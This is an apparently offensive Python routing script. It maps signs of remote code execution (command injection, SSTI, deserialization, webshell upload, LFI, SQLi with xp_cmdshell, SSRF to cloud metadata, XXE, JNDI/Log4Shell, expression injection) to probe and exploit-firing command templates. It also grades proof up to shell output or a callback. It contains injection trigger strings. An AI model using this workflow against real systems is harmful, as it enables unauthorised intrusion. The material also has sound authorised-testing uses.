#!/usr/bin/env python3
"""RCE 十形矩阵：攻击面 → 专卡 → rce_forge 族。不是百科结案。

  python3 炼蛊房/rce_family_route.py --signal 命令注入
  python3 炼蛊房/rce_family_route.py --list
  python3 炼蛊房/rce_family_route.py grade --kind primitive --note 'dnslog hit'
"""
from __future__ import annotations

import argparse
import json
import re
import sys

GRADES = (
    "hypothesis",
    "observed",
    "primitive",
    "local_proof",
    "remote_proof",
)

GRADE_NOTE = {
    "hypothesis": "只是猜测，标题/指纹像某组件",
    "observed": "页面/头/报错里看到版本或 sink 名",
    "primitive": "可控延时 / DNS / 报错，还不是 shell",
    "local_proof": "同版本靶场复现",
    "remote_proof": "授权目标 uid=/文件可执行/回连，可回滚",
}

# 先命中先赢
ROUTES: list[tuple[tuple[str, ...], dict]] = [
    (("命令注入", "cmdi", ";id", "|id", "$(id)", "os command"),
     {"form": "cmdi", "skill": "奴道驱使",
      "probe": "python3 炼蛊房/tpl_inject_probe.py cmdi --url <URL> --param <p> --case <案>",
      "forge": "cmdi-unix", "note": "先 se9359 再 shoot"}),
    (("ssti", "模板注入", "{{7*7}}", "jinja", "twig", "freemarker"),
     {"form": "ssti", "skill": "全力以赴",
      "probe": "python3 炼蛊房/tpl_inject_probe.py ssti --url <URL> --param <p> --case <案>",
      "forge": "ssti-jinja", "note": "算术 49/9359 过闸再 shoot"}),
    (("反序列化", "pickle", "ysoserial", "phpggc", "rO0", "gASV"),
     {"form": "deser", "skill": "化形",
      "probe": "python3 炼蛊房/rce_forge.py pack --family deser-pickle --case <案>",
      "forge": "deser-pickle", "note": "Java 走 ysoserial 专卡；PHP 走 PHP反序列化作业手法"}),
    (("文件上传", "webshell", "phtml", "双扩展", "getshell 上传"),
     {"form": "upload", "skill": "寄生蛊",
      "probe": "python3 炼蛊房/upload_forge_probe.py --help",
      "forge": "php-eval", "note": "写文件成功 ≠ RCE，必须 URL 执行出 uid="}),
    (("lfi", "文件包含", "php://filter", "lfi2rce"),
     {"form": "lfi", "skill": "开卷",
      "probe": "python3 炼蛊房/tpl_inject_probe.py lfi --url <URL> --param <p> --case <案>",
      "forge": "php-wrap", "note": "filter 读源 → 日志/会话/phar 再 RCE"}),
    (("sqli rce", "outfile", "xp_cmdshell", "udf", "copy to program"),
     {"form": "sqli", "skill": "无底洞",
      "probe": "python3 炼蛊房/sqlmap_kit.py ladder --url <URL> --case <案>",
      "forge": "", "note": "先注入过闸；OUTFILE/xp_cmdshell 才是 RCE"}),
    (("ssrf rce", "gopher redis", "169.254.169.254"),
     {"form": "ssrf", "skill": "定仙游",
      "probe": "python3 炼蛊房/ssrf_probe.py --url <URL> --param <p> --case <案>",
      "forge": "", "note": "打穿内网 Redis/IMDS 才升级 RCE"}),
    (("xxe", "外部实体", "expect://"),
     {"form": "xxe", "skill": "噬文·试",
      "probe": "python3 炼蛊房/tpl_inject_probe.py xxe --url <URL> --param <p> --case <案>",
      "forge": "xxe-expect", "note": "文件读是 primitive；expect:// 才是 RCE"}),
    (("jndi", "log4shell", "${jndi"),
     {"form": "jndi", "skill": "听声蛊",
      "probe": "python3 炼蛊房/rce_forge.py pack --family jndi --lhost <机> --lport 1389 --case <案>",
      "forge": "jndi", "note": "DNS 回连只算 primitive"}),
    (("表达式注入", "spel", "ognl", "groovy el"),
     {"form": "el", "skill": "注门",
      "probe": "python3 炼蛊房/rce_forge.py shoot --family el-spel --url <URL> --param <p> --case <案>",
      "forge": "el-spel", "note": ""}),
    (("抢rce", "getshell", "远程代码执行", "rce百科", "rce矩阵"),
     {"form": "router", "skill": "开天·十形",
      "probe": "python3 炼蛊房/rce_family_route.py --list",
      "forge": "", "note": "先认形再进专卡，禁止空喊 RCE"}),
]


def route(signal: str) -> dict:
    blob = (signal or "").lower()
    for keys, rec in ROUTES:
        hits = [k for k in keys if k.lower() in blob]
        if hits:
            out = dict(rec)
            out["signal"] = signal
            out["matched"] = hits
            out["shoot"] = (
                f"python3 炼蛊房/rce_forge.py shoot --family {rec['forge']} "
                "--url <URL> --param <p> --case <案>"
                if rec.get("forge") else ""
            )
            return out
    return {
        "signal": signal,
        "form": "unknown",
        "skill": "开天·十形",
        "matched": [],
        "probe": "python3 炼蛊房/rce_family_route.py --list",
        "forge": "",
        "shoot": "",
        "note": "未认形：先 strike / tpl_inject 再回本路由",
    }


def classify_hit(text: str, *, executed: bool = False) -> str:
    blob = text or ""
    if executed and re.search(r"(?<![A-Za-z])uid=\d+|nt authority\\system|root:[x*]:0:0:", blob, re.I):
        return "remote_proof"
    if re.search(r"(sleep|dnslog|burpcollaborator|oob)", blob, re.I):
        return "primitive"
    if re.search(r"(uid=|whoami|se9359|9359)", blob, re.I):
        return "observed"
    return "hypothesis"


def main() -> int:
    ap = argparse.ArgumentParser(description="RCE 十形路由")
    ap.add_argument("--signal", default="")
    ap.add_argument("--list", action="store_true")
    sub = ap.add_subparsers(dest="cmd")
    g = sub.add_parser("grade")
    g.add_argument("--kind", choices=GRADES, required=True)
    g.add_argument("--note", default="")
    args = ap.parse_args()
    if args.cmd == "grade":
        print(json.dumps({"grade": args.kind, "meaning": GRADE_NOTE[args.kind], "note": args.note}, ensure_ascii=False))
        return 0
    if args.list or not args.signal:
        for keys, rec in ROUTES:
            print(f"{rec['form']:8}  {rec['skill']:32}  {keys[0]}")
        return 0
    print(json.dumps(route(args.signal), ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
